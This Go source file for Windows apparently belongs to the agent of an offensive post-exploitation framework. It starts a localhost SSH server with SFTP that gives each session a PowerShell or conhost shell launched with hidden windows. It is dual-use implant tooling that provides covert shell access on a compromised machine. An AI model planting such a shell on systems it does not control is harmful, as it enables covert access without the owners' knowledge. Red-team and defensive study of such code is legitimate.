//go:build windows
// +build windows

package agent

import (
	"context"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"

	"github.com/gliderlabs/ssh"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/shirou/gopsutil/v3/process"
	"golang.org/x/sys/windows"
)

// SSHD start a ssh server to provide shell access for clients
// the server binds local interface only
func crossPlatformSSHD(shell, port string, args []string) (err error) {
	if strings.HasSuffix(shell, "bash") {
		// to use conhost.exe, the target must be at least Windows 7
		// so it's safe to just set shell to powershell.exe
		shell = "powershell.exe"
	} else {
		exe, e := exec.LookPath(shell)
		if err != nil {
			err = fmt.Errorf("%s not found (%v)", shell, e)
			log.Print(err)
			return
		}
		shell = exe
	}
	// ssh server
	ssh_server := ssh.Server{
		Addr: "127.0.0.1:" + port,
		SubsystemHandlers: map[string]ssh.SubsystemHandler{
			"sftp": SftpHandler,
		},
	}

	log.Printf("Using %s shell", strconv.Quote(shell))

	ssh_server.Handle(func(s ssh.Session) {
		cmd := exec.Command(shell, args...)
		if IsConPTYSupported() {
			log.Print("ConPTY supported, the shell will be interactive")
			args = append([]string{shell}, args...)
			cmd = exec.Command("conhost.exe", args...) // shell command
		}
		cmd.Env = os.Environ()
		cmd.Stderr = s
		cmd.Stdin = s
		cmd.Stdout = s

		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: windows.CREATE_NEW_CONSOLE,
		}
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		// console configs
		ptyReq, winCh, isPTY := s.Pty()
		if isPTY {
			log.Printf("Got an SSH PTY request: %s", ptyReq.Term)
			cmd.Env = append(cmd.Env, fmt.Sprintf("TERM=%s", ptyReq.Term))
		} else {
			log.Print("Got an SSH request")
		}

		if IsConPTYSupported() {

			go func() {
				defer func() {
					cancel()
					if cmd.Process != nil {
						// cleanup obsolete shell process
						cmd.Process.Kill()
					}
				}()
				for ctx.Err() == nil {
					if cmd.Process != nil {
						win := <-winCh
						if win.Width <= 0 || win.Height <= 0 {
							log.Printf("w/h is 0, aborting")
							return
						}
						conhost_pid := int32(cmd.Process.Pid)
						conhost_proc, err := process.NewProcess(conhost_pid)
						if err != nil {
							log.Printf("conhost process %d not found", conhost_pid)
							continue
						}

						var shell_proc *process.Process
						// wait until conhost.exe starts the shell
						for i := 0; i < 5; i++ {
							util.TakeABlink()
							children, err := conhost_proc.Children()
							if err != nil {
								log.Printf("conhost get children: %v", err)
								return
							}
							if len(children) > 0 {
								shell_proc = children[0] // there should be only 1 child
								break
							}
						}
						if shell_proc == nil {
							log.Printf("conhost.exe (%d) has no shell spawned", conhost_pid)
							return
						}
						SetCosoleWinsize(int(shell_proc.Pid), win.Width, win.Height)
					}
					util.TakeABlink()
				}
			}()
		}

		err = cmd.Start()
		if err != nil {
			log.Printf("Start shell %s: %v", shell, err)
			return
		}
		err = cmd.Wait() // wait until shell process dies
		if err != nil {
			log.Printf("Wait shell %s: %v", shell, err)
			return
		}
	})

	log.Printf("Starting SSHD on port %s...", port)
	return ssh_server.ListenAndServe()
}

// test if ConPTY is implemented in current OS
func IsConPTYSupported() bool {
	k32dll, err := windows.LoadLibrary("kernel32.dll")
	if err != nil {
		return false
	}
	_, err = windows.GetProcAddress(k32dll, "CreatePseudoConsole")
	if err == nil {
		log.Printf("ConPTY is supported")
		return true
	}

	return false
}
